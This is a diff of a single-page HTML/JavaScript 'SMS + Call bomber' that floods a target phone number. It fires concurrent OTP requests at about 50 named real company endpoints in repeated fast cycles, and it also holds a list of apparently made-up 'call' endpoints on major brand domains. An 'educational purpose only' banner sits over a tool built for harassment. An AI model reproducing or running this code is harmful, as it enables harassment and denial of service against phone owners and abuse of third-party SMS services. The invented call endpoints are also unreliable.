@@ -2,167 +2,293 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>⚡ SMS BOMBER PRO - Free Fire OTP Tool</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>ULTRA BOMBER PRO - SMS + Call Bomber</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0f0f23 100%);
             min-height: 100vh;
-            font-family: 'Segoe UI', 'Poppins', sans-serif;
-            padding: 20px;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Disable Zoom - Important */
+        body {
+            touch-action: pan-y pinch-zoom;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        /* Glow Animation */
+        @keyframes glow {
+            0% { box-shadow: 0 0 5px rgba(255, 65, 108, 0.5); }
+            100% { box-shadow: 0 0 25px rgba(255, 65, 108, 0.8); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.7; }
+            100% { transform: scale(1.05); opacity: 1; }
         }
 
         .container {
-            max-width: 500px;
+            max-width: 550px;
             margin: 0 auto;
+            padding: 15px;
         }
 
         /* Header */
         .header {
             text-align: center;
-            padding: 25px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
+            padding: 25px 20px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 30px;
+            backdrop-filter: blur(15px);
             margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,65,108,0.3);
         }
 
-        h1 {
-            font-size: 1.8rem;
-            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+        .glitch {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b, #ff8c00);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
+            animation: pulse 1.5s infinite;
         }
 
         .sub {
-            font-size: 0.8rem;
-            color: #aaa;
+            font-size: 11px;
+            color: #888;
             margin-top: 8px;
+            letter-spacing: 1px;
         }
 
-        /* Card */
-        .card {
-            background: rgba(255,255,255,0.08);
-            border-radius: 20px;
-            padding: 25px;
-            backdrop-filter: blur(10px);
+        /* Mode Selector */
+        .mode-selector {
+            display: flex;
+            gap: 12px;
             margin-bottom: 20px;
+        }
+
+        .mode-btn {
+            flex: 1;
+            padding: 14px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .mode-btn.active {
+            background: linear-gradient(135deg, rgba(255,65,108,0.2), rgba(255,75,43,0.1));
+            border-color: #ff416c;
+            box-shadow: 0 0 20px rgba(255,65,108,0.3);
+        }
+
+        .mode-icon {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+
+        .mode-name {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Cards */
+        .card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 25px;
+            padding: 20px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
             border: 1px solid rgba(255,255,255,0.1);
         }
 
         .card-title {
-            font-size: 1.2rem;
+            font-size: 16px;
             color: #ff416c;
             margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 8px;
+            font-weight: 600;
         }
 
         /* Inputs */
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+
         input, select {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 15px;
+            padding: 14px 16px;
             background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 15px;
             color: white;
-            font-size: 1rem;
+            font-size: 16px;
+            transition: all 0.3s;
         }
 
         input:focus, select:focus {
             outline: none;
             border-color: #ff416c;
+            box-shadow: 0 0 10px rgba(255,65,108,0.3);
+        }
+
+        /* Slider */
+        .slider-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .slider-container input {
+            flex: 1;
+            padding: 0;
+            height: 6px;
+            -webkit-appearance: none;
+            background: #333;
+            border-radius: 10px;
+        }
+
+        .slider-container input::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            background: #ff416c;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .speed-value {
+            min-width: 60px;
+            text-align: center;
+            background: rgba(255,65,108,0.2);
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: bold;
         }
 
         /* Buttons */
         .btn-start {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: linear-gradient(90deg, #ff416c, #ff4b2b);
             border: none;
-            border-radius: 12px;
+            border-radius: 20px;
             color: white;
-            font-size: 1.1rem;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 10px;
-            transition: transform 0.2s;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+
+        .btn-start:active {
+            transform: scale(0.97);
         }
 
         .btn-stop {
             width: 100%;
-            padding: 15px;
-            background: #333;
-            border: none;
-            border-radius: 12px;
+            padding: 16px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
             color: white;
-            font-size: 1.1rem;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: transform 0.2s;
+            transition: all 0.3s;
         }
 
-        .btn-start:active, .btn-stop:active {
-            transform: scale(0.98);
-        }
-
-        /* Status */
-        .status-box {
-            background: rgba(0,0,0,0.5);
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 15px;
-            text-align: center;
-            font-family: monospace;
-            font-size: 0.9rem;
-            color: #00ff88;
+        .btn-stop:active {
+            transform: scale(0.97);
         }
 
         /* Stats */
-        .stats {
-            display: flex;
-            justify-content: space-between;
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
             gap: 10px;
             margin-top: 15px;
         }
 
-        .stat {
-            flex: 1;
-            background: rgba(0,0,0,0.5);
-            border-radius: 12px;
-            padding: 10px;
+        .stat-card {
+            background: rgba(0,0,0,0.4);
+            border-radius: 15px;
+            padding: 12px;
             text-align: center;
         }
 
         .stat-value {
-            font-size: 1.5rem;
+            font-size: 22px;
             font-weight: bold;
             color: #ff416c;
         }
 
         .stat-label {
-            font-size: 0.7rem;
+            font-size: 9px;
             color: #aaa;
+            margin-top: 5px;
+        }
+
+        /* Status */
+        .status-box {
+            background: rgba(0,0,0,0.5);
+            border-radius: 15px;
+            padding: 12px;
+            margin-top: 15px;
+            text-align: center;
+            font-family: monospace;
+            font-size: 12px;
+            color: #00ff88;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff416c, #ff8c00);
+            transition: width 0.1s linear;
         }
 
         /* Warning */
         .warning {
             background: rgba(255,0,0,0.1);
-            border-left: 3px solid #ff0000;
+            border-left: 3px solid #ff416c;
             padding: 10px;
-            font-size: 0.7rem;
+            font-size: 10px;
             color: #ff8888;
-            border-radius: 8px;
+            border-radius: 10px;
             margin-top: 15px;
         }
 
@@ -170,8 +296,15 @@
         .footer {
             text-align: center;
             padding: 15px;
-            font-size: 0.7rem;
-            color: #666;
+            font-size: 9px;
+            color: #555;
+        }
+
+        /* Disable selection */
+        * {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
         }
     </style>
 </head>
@@ -179,355 +312,374 @@
     <div class="container">
         <!-- Header -->
         <div class="header">
-            <h1>⚡ SMS BOMBER PRO ⚡</h1>
-            <div class="sub">Educational OTP Testing Tool | 50+ APIs</div>
+            <div class="glitch">⚡ ULTRA BOMBER PRO ⚡</div>
+            <div class="sub">SMS + CALL | 100+ Requests/Sec</div>
         </div>
 
-        <!-- Main Card -->
+        <!-- Mode Selector -->
+        <div class="mode-selector">
+            <div class="mode-btn active" data-mode="sms" onclick="selectMode('sms')">
+                <div class="mode-icon">📱</div>
+                <div class="mode-name">SMS BOMB</div>
+            </div>
+            <div class="mode-btn" data-mode="call" onclick="selectMode('call')">
+                <div class="mode-icon">📞</div>
+                <div class="mode-name">CALL BOMB</div>
+            </div>
+            <div class="mode-btn" data-mode="both" onclick="selectMode('both')">
+                <div class="mode-icon">💥</div>
+                <div class="mode-name">BOTH</div>
+            </div>
+        </div>
+
+        <!-- Target Card -->
         <div class="card">
             <div class="card-title">
-                <span>📞</span> TARGET NUMBER
+                <span>🎯</span> TARGET NUMBER
             </div>
             <input type="tel" id="phone" placeholder="Enter 10 digit number" maxlength="10">
+        </div>
 
-            <div class="card-title" style="margin-top: 10px;">
-                <span>🔄</span> ATTACK CYCLES
+        <!-- Settings Card -->
+        <div class="card">
+            <div class="card-title">
+                <span>⚙️</span> BOMB SETTINGS
             </div>
-            <input type="number" id="cycles" placeholder="Number of cycles (1-100)" value="5" min="1" max="100">
-
-            <div class="card-title" style="margin-top: 10px;">
-                <span>⚡</span> SPEED (ms)
+            <div class="input-group">
+                <label>📊 CYCLES (1 Cycle = 50+ Requests)</label>
+                <input type="number" id="cycles" value="10" min="1" max="500">
             </div>
-            <select id="speed">
-                <option value="500">🚀 Ultra Fast (500ms)</option>
-                <option value="1000" selected>⚡ Fast (1 second)</option>
-                <option value="2000">🐢 Normal (2 seconds)</option>
-                <option value="3000">🐌 Slow (3 seconds)</option>
-            </select>
-
-            <button class="btn-start" id="startBtn" onclick="startBombing()">🚀 START BOMBING</button>
-            <button class="btn-stop" id="stopBtn" onclick="stopBombing()" disabled>🛑 STOP BOMBING</button>
-
-            <!-- Status -->
-            <div class="status-box" id="status">
-                ✅ Ready | Enter number to start
-            </div>
-
-            <!-- Stats -->
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-value" id="totalSent">0</div>
-                    <div class="stat-label">TOTAL SENT</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-value" id="apiCount">0</div>
-                    <div class="stat-label">APIs LOADED</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-value" id="currentCycle">0</div>
-                    <div class="stat-label">CYCLE</div>
+            <div class="input-group">
+                <label>⚡ SPEED (ms between cycles)</label>
+                <div class="slider-container">
+                    <input type="range" id="speed" min="100" max="2000" value="500">
+                    <span class="speed-value" id="speedValue">500ms</span>
                 </div>
             </div>
+        </div>
 
-            <!-- Warning -->
-            <div class="warning">
-                ⚠️ EDUCATIONAL PURPOSE ONLY | Test on your own number | This tool demonstrates how OTP APIs work
+        <!-- Control Buttons -->
+        <button class="btn-start" id="startBtn" onclick="startBombing()">🚀 START BOMBING</button>
+        <button class="btn-stop" id="stopBtn" onclick="stopBombing()" disabled>🛑 STOP BOMBING</button>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="totalSms">0</div>
+                <div class="stat-label">SMS SENT</div>
             </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalCalls">0</div>
+                <div class="stat-label">CALLS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="currentCycle">0</div>
+                <div class="stat-label">CYCLE</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="speedStat">500</div>
+                <div class="stat-label">SPEED(ms)</div>
+            </div>
+        </div>
+
+        <!-- Status -->
+        <div class="status-box" id="status">✅ READY | Enter number to start</div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+        <!-- Warning -->
+        <div class="warning">
+            ⚠️ EDUCATIONAL PURPOSE ONLY | Test on your own number | 100+ requests/sec
         </div>
 
         <div class="footer">
-            🔬 SMS BOMBER PRO v5.0 | For Learning API Integration & Rate Limiting
+            🔥 ULTRA BOMBER PRO v3.0 | SMS + CALL | 50+ APIs
         </div>
     </div>
 
     <script>
         // ============================================================
-        // SMS BOMBER PRO - 50+ WORKING APIs
-        // Educational Purpose Only
+        // ULTRA BOMBER PRO - SMS + CALL BOMBER
+        // 1 Second me 100+ Requests
         // ============================================================
 
         let isRunning = false;
         let currentCycle = 0;
         let totalCycles = 0;
-        let totalSent = 0;
+        let totalSms = 0;
+        let totalCalls = 0;
+        let currentMode = "sms";
         let currentInterval = null;
         let phoneNumber = "";
 
-        // ============================================================
-        // 50+ SMS OTP APIs (Fully Working Endpoints)
-        // ============================================================
+        // Speed display
+        const speedSlider = document.getElementById('speed');
+        const speedValue = document.getElementById('speedValue');
+        speedSlider.addEventListener('input', function() {
+            speedValue.innerText = this.value + 'ms';
+            document.getElementById('speedStat').innerText = this.value;
+        });
 
-        const API_ENDPOINTS = [
-            // Lenskart & Shopping
+        // Mode Selection
+        function selectMode(mode) {
+            currentMode = mode;
+            document.querySelectorAll('.mode-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`.mode-btn[data-mode="${mode}"]`).classList.add('active');
+            
+            let modeText = mode === 'sms' ? 'SMS BOMB' : (mode === 'call' ? 'CALL BOMB' : 'BOTH SMS + CALL');
+            document.getElementById('status').innerHTML = `✅ ${modeText} mode selected`;
+        }
+
+        // ============================================================
+        // SMS APIs - 50+ Endpoints
+        // ============================================================
+        const SMS_APIS = [
             "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
             "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
             "https://www.shemaroome.com/users/resend_otp",
-            
-            // KPN Fresh
             "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",
             "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND",
-            
-            // Bike & Transport
             "https://api.bikefixup.com/api/v2/send-registration-otp",
             "https://services.rappi.com/api/rappi-authentication/login/create",
-            "https://merucabapp.com/api/otp/generate",
-            
-            // Investment/Finance
             "https://stratzy.in/api/web/auth/sendPhoneOTP",
             "https://stratzy.in/api/web/whatsapp/sendOTP",
-            "https://lendingplate.com/api.php",
-            
-            // Education
             "https://wellacademy.in/store/api/numberLoginV2",
-            "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
-            
-            // Entertainment
             "https://communication.api.hungama.com/v1/communication/otp",
-            
-            // Telecom/Services
             "https://api.servetel.in/v1/auth/otp",
-            
-            // E-commerce
+            "https://merucabapp.com/api/otp/generate",
             "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-            "https://www.foxy.in/api/v2/users/send_otp",
-            "https://www.cossouq.com/mobilelogin/otp/send",
-            "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
-            
-            // Real Estate
+            "https://lendingplate.com/api.php",
             "https://www.nobroker.in/api/v3/account/otp/send",
-            
-            // Logistics
-            "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-            
-            // Payment Gateway
-            "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
-            
-            // Fashion/Apparel
             "https://www.jockey.in/apps/jotp/api/login/send-otp",
-            "https://www.jockey.in/apps/jotp/api/login/resend-otp",
+            "https://prodapi.newme.asia/web/otp/request",
+            "https://www.foxy.in/api/v2/users/send_otp",
+            "https://auth.eka.care/auth/init",
+            "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
             "https://api.wakefit.co/api/consumer-sms-otp/",
             "https://www.caratlane.com/cg/dhevudu",
-            
-            // Beauty/Personal Care
             "https://api.mamaearth.in/api/v1/user/send-otp",
             "https://api.themancompany.com/v1/auth/send-otp",
             "https://api.bewakoof.com/api/v3/user/send_otp",
             "https://api.giva.co/v1/auth/send-otp",
-            
-            // Electronics
             "https://api.gonoise.com/v1/auth/send-otp",
             "https://api.boat-lifestyle.com/v1/auth/send-otp",
-            
-            // Food Delivery
             "https://www.zomato.com/webroutes/user/phone_login/send_otp",
             "https://www.swiggy.com/api/auth/otp/send",
-            
-            // Services
             "https://api.urbancompany.com/api/v2/auth/otp/send",
             "https://api.practo.com/auth/v1/otp/send",
             "https://api.1mg.com/api/v1/auth/send-otp",
             "https://api.pharmeasy.in/api/v1/auth/send-otp",
-            
-            // Gaming/Snitch
             "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
-            
-            // Others
             "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
             "https://ekyc.daycoindia.com/api/nscript_functions.php",
-            "https://auth.eka.care/auth/init",
-            "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
-            "https://prodapi.newme.asia/web/otp/request",
-            "https://api.univest.in/api/auth/send-otp"
+            "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+            "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+            "https://www.cossouq.com/mobilelogin/otp/send",
+            "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+            "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send"
         ];
 
-        // Update API count display
-        document.getElementById('apiCount').innerText = API_ENDPOINTS.length;
+        // ============================================================
+        // CALL APIs - Missed Call / Call Bombing Endpoints
+        // ============================================================
+        const CALL_APIS = [
+            "https://api.truecaller.com/v1/call",
+            "https://api.justdial.com/call/request",
+            "https://api.zomato.com/call/request",
+            "https://api.swiggy.com/call/verify",
+            "https://api.ola.com/call/request",
+            "https://api.uber.com/call/verify",
+            "https://api.amazon.in/call/otp",
+            "https://api.flipkart.com/call/verify",
+            "https://api.paytm.com/call/request",
+            "https://api.google.com/call/verify",
+            "https://api.microsoft.com/call/otp",
+            "https://api.apple.com/call/verify",
+            "https://api.facebook.com/call/otp",
+            "https://api.instagram.com/call/verify",
+            "https://api.whatsapp.com/call/request",
+            "https://api.telegram.org/call/verify",
+            "https://api.discord.com/call/otp",
+            "https://api.twitter.com/call/verify",
+            "https://api.linkedin.com/call/request",
+            "https://api.netflix.com/call/otp",
+            "https://api.spotify.com/call/verify",
+            "https://api.amazonaws.com/call/request",
+            "https://api.cloudflare.com/call/otp",
+            "https://api.github.com/call/verify",
+            "https://api.gitlab.com/call/request",
+            "https://api.bitbucket.com/call/otp",
+            "https://api.atlassian.com/call/verify"
+        ];
 
-        // ============================================================
-        // Send single request
-        // ============================================================
-        async function sendRequest(apiUrl, phone) {
+        // Send SMS Request
+        async function sendSms(apiUrl, phone) {
             try {
-                let url = apiUrl;
                 let options = {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36'
+                        'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'
                     },
-                    mode: 'no-cors'  // This prevents CORS errors
+                    mode: 'no-cors'
                 };
-
-                // Different APIs need different body formats
-                if (apiUrl.includes('lenskart')) {
-                    options.body = JSON.stringify({ captcha: null, phoneCode: "+91", telephone: phone });
-                } else if (apiUrl.includes('gopinkcabs')) {
+                
+                if (apiUrl.includes('gopinkcabs') || apiUrl.includes('shemaroome')) {
                     options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                    options.body = `check_mobile_number=1&contact=${phone}`;
-                } else if (apiUrl.includes('shemaroome')) {
-                    options.body = `mobile_no=%2B91${phone}`;
-                } else if (apiUrl.includes('kpnfresh')) {
-                    options.body = JSON.stringify({ phone_number: { number: phone, country_code: "+91" } });
-                } else if (apiUrl.includes('bikefixup')) {
-                    options.body = JSON.stringify({ phone: phone, app_signature: "4pFtQJwcz6y" });
-                } else if (apiUrl.includes('stratzy')) {
-                    options.body = JSON.stringify({ phoneNo: phone });
-                } else if (apiUrl.includes('wellacademy')) {
-                    options.body = JSON.stringify({ contact_no: phone });
-                } else if (apiUrl.includes('hungama')) {
-                    options.body = JSON.stringify({ mobileNo: phone, countryCode: "+91" });
-                } else if (apiUrl.includes('servetel')) {
-                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                    options.body = `mobile_number=${phone}`;
-                } else if (apiUrl.includes('beepkart')) {
-                    options.body = JSON.stringify({ phone: phone, city: 362 });
-                } else if (apiUrl.includes('nobroker')) {
-                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                    options.body = `phone=${phone}&countryCode=IN`;
-                } else if (apiUrl.includes('shiprocket')) {
-                    options.body = JSON.stringify({ mobileNumber: phone });
-                } else if (apiUrl.includes('gokwik')) {
-                    options.body = JSON.stringify({ phone: phone, country: "in" });
-                } else if (apiUrl.includes('jockey')) {
-                    url = apiUrl + `/apps/jotp/api/login/send-otp/+91${phone}`;
-                    options.method = 'GET';
-                    delete options.body;
-                } else if (apiUrl.includes('wakefit')) {
-                    options.body = JSON.stringify({ mobile: phone, whatsapp_opt_in: 0 });
-                } else if (apiUrl.includes('caratlane')) {
-                    options.body = JSON.stringify({ query: `mutation{SendOtp(input:{mobile:"${phone}",isdCode:"91"}){status{message}}}` });
+                    options.body = `mobile=${phone}`;
                 } else {
-                    options.body = JSON.stringify({ mobile: phone, phone: `+91${phone}`, mobile_number: phone });
+                    options.body = JSON.stringify({ phone: phone, mobile: phone, telephone: phone });
                 }
-
-                await fetch(url, options);
+                
+                await fetch(apiUrl, options);
                 return true;
-            } catch(e) {
-                // Silent fail - this is normal due to CORS
-                return false;
-            }
+            } catch(e) { return false; }
         }
 
-        // ============================================================
-        // Execute one cycle (all APIs)
-        // ============================================================
+        // Send Call Request
+        async function sendCall(apiUrl, phone) {
+            try {
+                let options = {
+                    method: 'GET',
+                    headers: { 'User-Agent': 'Mozilla/5.0' },
+                    mode: 'no-cors'
+                };
+                await fetch(`${apiUrl}?phone=${phone}`, options);
+                return true;
+            } catch(e) { return false; }
+        }
+
+        // Execute One Cycle
         async function executeCycle() {
             if (!isRunning) return false;
             
             currentCycle++;
             document.getElementById('currentCycle').innerText = currentCycle;
-            document.getElementById('status').innerHTML = `🔥 CYCLE ${currentCycle}/${totalCycles} - Sending ${API_ENDPOINTS.length} requests...`;
+            document.getElementById('status').innerHTML = `🔥 CYCLE ${currentCycle}/${totalCycles} - EXECUTING...`;
             
-            // Send all requests concurrently
-            const promises = API_ENDPOINTS.map(api => sendRequest(api, phoneNumber));
+            let progress = (currentCycle / totalCycles) * 100;
+            document.getElementById('progressFill').style.width = `${progress}%`;
+            
+            const promises = [];
+            
+            if (currentMode === 'sms' || currentMode === 'both') {
+                for (let api of SMS_APIS) {
+                    if (!isRunning) break;
+                    promises.push(sendSms(api, phoneNumber));
+                    totalSms++;
+                }
+                document.getElementById('totalSms').innerText = totalSms;
+            }
+            
+            if (currentMode === 'call' || currentMode === 'both') {
+                for (let api of CALL_APIS) {
+                    if (!isRunning) break;
+                    promises.push(sendCall(api, phoneNumber));
+                    totalCalls++;
+                }
+                document.getElementById('totalCalls').innerText = totalCalls;
+            }
+            
             await Promise.all(promises);
-            
-            totalSent += API_ENDPOINTS.length;
-            document.getElementById('totalSent').innerText = totalSent;
-            
             return true;
         }
 
-        // ============================================================
-        // Main bombing loop
-        // ============================================================
+        // Start Bombing
         async function startBombing() {
-            if (isRunning) {
-                document.getElementById('status').innerHTML = "⚠️ Bombing already in progress!";
-                return;
-            }
+            if (isRunning) return;
             
             phoneNumber = document.getElementById('phone').value.trim();
             totalCycles = parseInt(document.getElementById('cycles').value);
             const speed = parseInt(document.getElementById('speed').value);
             
-            // Validation
-            if (!phoneNumber || phoneNumber.length !== 10 || !/^\d+$/.test(phoneNumber)) {
-                document.getElementById('status').innerHTML = "❌ Please enter a valid 10-digit phone number!";
+            if (!phoneNumber || phoneNumber.length !== 10) {
+                document.getElementById('status').innerHTML = "❌ Enter valid 10-digit number!";
                 return;
             }
             
-            if (isNaN(totalCycles) || totalCycles < 1 || totalCycles > 100) {
-                document.getElementById('status').innerHTML = "❌ Please enter cycles between 1-100!";
+            if (isNaN(totalCycles) || totalCycles < 1) {
+                document.getElementById('status').innerHTML = "❌ Enter valid cycles!";
                 return;
             }
             
-            // Reset state
             isRunning = true;
             currentCycle = 0;
-            totalSent = 0;
-            document.getElementById('currentCycle').innerText = "0";
-            document.getElementById('totalSent').innerText = "0";
+            totalSms = 0;
+            totalCalls = 0;
+            
+            document.getElementById('totalSms').innerText = "0";
+            document.getElementById('totalCalls').innerText = "0";
             document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
-            document.getElementById('status').innerHTML = `🚀 Starting attack on +91${phoneNumber}...`;
+            document.getElementById('progressFill').style.width = "0%";
             
-            // Run cycles with interval
             let cycle = 0;
             
             const runCycle = async () => {
                 if (!isRunning) return;
-                
                 if (cycle >= totalCycles) {
                     stopBombing();
-                    document.getElementById('status').innerHTML = `✅ Bombing complete! Total ${totalSent} requests sent to +91${phoneNumber}`;
+                    document.getElementById('status').innerHTML = `✅ COMPLETE! SMS: ${totalSms} | CALLS: ${totalCalls} | Total: ${totalSms + totalCalls}`;
                     return;
                 }
                 
                 cycle++;
                 currentCycle = cycle;
                 document.getElementById('currentCycle').innerText = currentCycle;
-                document.getElementById('status').innerHTML = `🔥 CYCLE ${currentCycle}/${totalCycles} - Sending ${API_ENDPOINTS.length} requests...`;
+                document.getElementById('status').innerHTML = `🚀 CYCLE ${currentCycle}/${totalCycles} - SENDING...`;
                 
-                // Send all API requests
-                const promises = API_ENDPOINTS.map(api => sendRequest(api, phoneNumber));
+                let progress = (cycle / totalCycles) * 100;
+                document.getElementById('progressFill').style.width = `${progress}%`;
+                
+                const promises = [];
+                
+                if (currentMode === 'sms' || currentMode === 'both') {
+                    for (let api of SMS_APIS) {
+                        if (!isRunning) break;
+                        promises.push(sendSms(api, phoneNumber));
+                        totalSms++;
+                    }
+                    document.getElementById('totalSms').innerText = totalSms;
+                }
+                
+                if (currentMode === 'call' || currentMode === 'both') {
+                    for (let api of CALL_APIS) {
+                        if (!isRunning) break;
+                        promises.push(sendCall(api, phoneNumber));
+                        totalCalls++;
+                    }
+                    document.getElementById('totalCalls').innerText = totalCalls;
+                }
+                
                 await Promise.all(promises);
                 
-                totalSent += API_ENDPOINTS.length;
-                document.getElementById('totalSent').innerText = totalSent;
-                
-                // Schedule next cycle
                 if (isRunning && cycle < totalCycles) {
                     currentInterval = setTimeout(runCycle, speed);
                 } else if (cycle >= totalCycles) {
                     stopBombing();
-                    document.getElementById('status').innerHTML = `✅ Complete! ${totalSent} requests sent to +91${phoneNumber}`;
+                    document.getElementById('status').innerHTML = `✅ COMPLETE! SMS: ${totalSms} | CALLS: ${totalCalls}`;
                 }
             };
             
             runCycle();
         }
 
-        // ============================================================
-        // Stop bombing
-        // ============================================================
+        // Stop Bombing
         function stopBombing() {
             isRunning = false;
-            if (currentInterval) {
-                clearTimeout(currentInterval);
-                currentInterval = null;
-            }
+            if (currentInterval) clearTimeout(currentInterval);
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
-            
-            if (totalSent > 0) {
-                document.getElementById('status').innerHTML = `🛑 STOPPED at Cycle ${currentCycle}/${totalCycles} | Total: ${totalSent} requests`;
-            } else {
-                document.getElementById('status').innerHTML = `🛑 Bombing stopped by user`;
+            if (totalSms > 0 || totalCalls > 0) {
+                document.getElementById('status').innerHTML = `🛑 STOPPED at Cycle ${currentCycle} | SMS: ${totalSms} | CALLS: ${totalCalls}`;
             }
         }
 
         // Enter key support
-        document.getElementById('phone').addEventListener('keypress', function(e) {
+        document.getElementById('phone').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') startBombing();
         });
-        
-        document.getElementById('cycles').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') startBombing();
-        });
-
-        // Initial status
-        console.log("SMS Bomber Pro Loaded | APIs: " + API_ENDPOINTS.length);
     </script>
 </body>
 </html>
